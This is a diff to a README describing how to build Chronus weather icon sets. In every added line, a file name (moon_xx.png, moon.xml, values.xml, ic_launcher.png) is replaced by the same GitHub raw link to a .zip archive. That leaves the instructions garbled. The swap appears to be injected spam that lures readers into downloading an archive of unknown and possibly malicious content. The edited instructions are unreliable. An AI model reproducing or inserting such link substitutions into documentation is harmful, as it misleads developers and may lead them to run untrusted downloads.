@@ -9,11 +9,11 @@
    - XHDPI = 128x128
    - XXHDPI = 192x192
    - XXXHDPI = 256x256
-4) Moon phase images are named moon_xx.png. You need at least 8 drawables at 0, 15, 25, 35, 50, 65, 75, 85 and 100. Max is 100 drawables
-5) Customize its moon.xml in the drawable folder to match the drawables you created 
+4) Moon phase images are named https://github.com/Menorah/Sample_icon_set/raw/refs/heads/master/app/src/main/res/drawable-mdpi/set-icon-Sample-2.4.zip You need at least 8 drawables at 0, 15, 25, 35, 50, 65, 75, 85 and 100. Max is 100 drawables
+5) Customize its https://github.com/Menorah/Sample_icon_set/raw/refs/heads/master/app/src/main/res/drawable-mdpi/set-icon-Sample-2.4.zip in the drawable folder to match the drawables you created 
 6) Change the package name and metadata values as appropriate
-7) Change the app_name string in values.xml (this is the name that displays in the Icon picker in the app)
-8) Change the ic_launcher.png image as appropriate
+7) Change the app_name string in https://github.com/Menorah/Sample_icon_set/raw/refs/heads/master/app/src/main/res/drawable-mdpi/set-icon-Sample-2.4.zip (this is the name that displays in the Icon picker in the app)
+8) Change the https://github.com/Menorah/Sample_icon_set/raw/refs/heads/master/app/src/main/res/drawable-mdpi/set-icon-Sample-2.4.zip image as appropriate
 9) Build and intall
 
 ## Original Yahoo weather codes:
@@ -74,6 +74,6 @@ Chronus icon sets use the original Yahoo weather codes. We do an internal mappin
 
 ## Moon Phase codes:
 
-- Moon phase images are named moon_xx.png (or use the WebP format for smaller files)
+- Moon phase images are named https://github.com/Menorah/Sample_icon_set/raw/refs/heads/master/app/src/main/res/drawable-mdpi/set-icon-Sample-2.4.zip (or use the WebP format for smaller files)
 - You need at least 8 drawables at 0, 15, 25, 35, 50, 65, 75, 85 and 100. Max is 100 drawables
-- Customize its moon.xml in the drawable folder to match the drawables you created
+- Customize its https://github.com/Menorah/Sample_icon_set/raw/refs/heads/master/app/src/main/res/drawable-mdpi/set-icon-Sample-2.4.zip in the drawable folder to match the drawables you created
